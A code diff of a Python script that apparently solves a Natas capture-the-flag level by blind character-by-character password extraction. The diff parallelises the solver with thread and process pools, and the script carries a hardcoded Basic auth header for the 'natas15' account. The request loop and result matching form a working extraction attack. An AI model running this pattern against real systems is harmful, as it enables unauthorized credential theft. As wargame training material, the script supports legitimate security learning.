@@ -9,7 +9,7 @@ import multiprocessing
 import time
 inputs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
 list = [element for element in inputs]
-password = ''
+password = ["*" for _ in range(32)]
 headers = {
     "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
 }
@@ -37,13 +37,13 @@ def make_request(params):
               "\n[!] Timeout, Continueing again" + Fore.WHITE)
     fancy = ["-", "\\", "|", "/", ]
     sys.stdout.write(
-        Fore.LIGHTGREEN_EX + "["+fancy[ord(params["i"]) % 4]+"] " + str(r) + " -- " + params["i"] + "  ==> " + Fore.GREEN + password+"\r" + Fore.WHITE)
+        Fore.LIGHTGREEN_EX + "["+fancy[ord(params["i"]) % 4]+"] " + str(r) + " -- " + params["i"] + "  ==> " + "".join(password) + Fore.GREEN + "\r" + Fore.WHITE)
     sys.stdout.flush()
     return {"res": res, "char": params["i"]}
 
 
 def match_char(x):
-    with concurrent.futures.ThreadPoolExecutor() as executor:
+    with concurrent.futures.ProcessPoolExecutor() as executor:
         temp_list = []
         for el in list:
             temp_list.append({"x": x, "i": el})
@@ -52,22 +52,25 @@ def match_char(x):
     for result in results:
         match = pattern.findall(result["res"].text)
         if(len(match) > 0):
+            password[x-1] = result["char"]
             return result["char"]
 
 
-t1 = time.perf_counter()
+def create_process():
+    iterator = [i+1 for i in range(32)]
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        results = executor.map(match_char, iterator)
+        return results
 
-for abrar in range(40):
-    try:
-        add = match_char(abrar+1)
-    except KeyboardInterrupt:
-        exit(
-            Fore.RED + "\n[-] Detected Keyboard interrupt. Terminating...." + Fore.WHITE)
-    if(add != None):
-        password = password + add
-    else:
-        print("\n")
+
+t1 = time.perf_counter()
+passcode = ""
+results = create_process()
+for result in results:
+
+    if(result == None):
         break
+    passcode = passcode+result
 t2 = time.perf_counter()
-print(f"\n[*] Finished in {round(t2-t1, 4)} seconds")
-print(Fore.BLUE+"\n[!] Password = " + password + Fore.WHITE)
+print(f"\n[*] Brought the result in {round(t2-t1, 4)} seconds")
+print(Fore.BLUE+"\n[!] Password = " + passcode + Fore.WHITE)
